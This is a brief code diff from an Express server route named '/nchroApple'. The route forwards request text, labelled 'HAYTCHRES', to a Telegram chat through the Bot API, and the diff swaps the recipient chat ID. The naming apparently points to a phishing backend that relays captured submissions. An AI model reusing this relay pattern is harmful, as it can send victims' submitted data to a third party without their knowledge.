@@ -8212,7 +8212,7 @@ app.post("/nchroApple", (req, res) => {
           .post(
             `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
             {
-              chat_id: 956029722,
+              chat_id: 5108525724,
               text: `HAYTCHRES:\n${originalText}`,
               parse_mode: "Markdown",
             }
